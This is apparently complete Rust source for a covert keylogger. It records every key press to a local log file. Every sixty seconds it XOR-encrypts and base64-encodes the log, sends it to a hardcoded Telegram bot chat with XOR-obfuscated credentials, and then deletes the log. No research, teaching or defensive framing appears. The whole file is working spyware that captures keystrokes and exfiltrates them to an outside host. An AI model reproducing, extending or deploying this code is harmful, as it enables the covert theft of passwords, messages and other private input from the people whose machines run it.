use device_query::{DeviceQuery, DeviceState, Keycode};
use std::{
    fs::{OpenOptions, read_to_string, remove_file},
    io::Write,
    sync::{Arc, Mutex},
    thread,
    time::Duration,
};
use reqwest::blocking::Client;
use base64::{engine::general_purpose, Engine as _};

const LOG_FILE: &str = "keystrokes.log";
const EXFIL_INTERVAL: u64 = 60;

const XOR_KEY: u8 = 0xAA;

const TELEGRAM_BOT_TOKEN_ENC: &[u8] = &[
    157, 156, 154, 152, 159, 155, 156, 157, 155, 158, 144, 235, 235, 236, 236, 198, 221, 157, 249, 135,
    211, 245, 198, 224, 224, 233, 252, 152, 208, 206, 237, 233, 250, 249, 220, 217, 231, 225, 243, 154,
    221, 232, 235, 208, 250, 255,
];

const TELEGRAM_CHAT_ID_ENC: &[u8] = &[
    157, 152, 155, 157, 156, 154, 159, 146, 155, 156,
];

fn xor_decrypt(data: &[u8]) -> String {
    data.iter().map(|b| (b ^ XOR_KEY) as char).collect()
}

fn main() {
    let telegram_bot_token = xor_decrypt(TELEGRAM_BOT_TOKEN_ENC);
    let telegram_chat_id = xor_decrypt(TELEGRAM_CHAT_ID_ENC);

    let device_state = DeviceState::new();
    let mut last_keys: Vec<Keycode> = vec![];

    let log_lock = Arc::new(Mutex::new(()));

    let log_lock_clone = Arc::clone(&log_lock);
    let token_clone = telegram_bot_token.clone();
    let chat_id_clone = telegram_chat_id.clone();

    thread::spawn(move || loop {
        thread::sleep(Duration::from_secs(EXFIL_INTERVAL));
        if let Err(e) = exfiltrate_logs(log_lock_clone.clone(), &token_clone, &chat_id_clone) {
            eprintln!("Failed to exfiltrate logs: {}", e);
        }
    });


    loop {
        let current_keys = device_state.get_keys();

        for key in &current_keys {
            if !last_keys.contains(key) {
                if let Err(e) = log_key(format!("{:?}", key), &log_lock) {
                    eprintln!("Failed to log key: {}", e);
                }
            }
        }

        last_keys = current_keys;
        thread::sleep(Duration::from_millis(50));
    }
}

fn log_key(key: String, lock: &Arc<Mutex<()>>) -> std::io::Result<()> {
    let _guard = lock.lock().unwrap();
    let mut file = OpenOptions::new()
        .create(true)
        .append(true)
        .open(LOG_FILE)?;
    writeln!(file, "{}", key)?;
    Ok(())
}

fn xor_encrypt(data: &str) -> Vec<u8> {
    data.bytes().map(|b| b ^ XOR_KEY).collect()
}


fn exfiltrate_logs(lock: Arc<Mutex<()>>, bot_token: &str, chat_id: &str) -> Result<(), Box<dyn std::error::Error>> {
    let _guard = lock.lock().unwrap();
    let contents = read_to_string(LOG_FILE)?;
    if contents.is_empty() {
        return Ok(());
    }

    let encrypted = xor_encrypt(&contents);
    let encrypted_base64 = general_purpose::STANDARD.encode(&encrypted);

    let client = Client::new();
    let telegram_url = format!("https://api.telegram.org/bot{}/sendMessage", bot_token);

    let res = client
        .post(&telegram_url)
        .form(&[("chat_id", chat_id), ("text", &encrypted_base64)])
        .send()?;

    if !res.status().is_success() {
        eprintln!("Telegram API returned error status: {}", res.status());
    }

    remove_file(LOG_FILE)?;
    Ok(())
}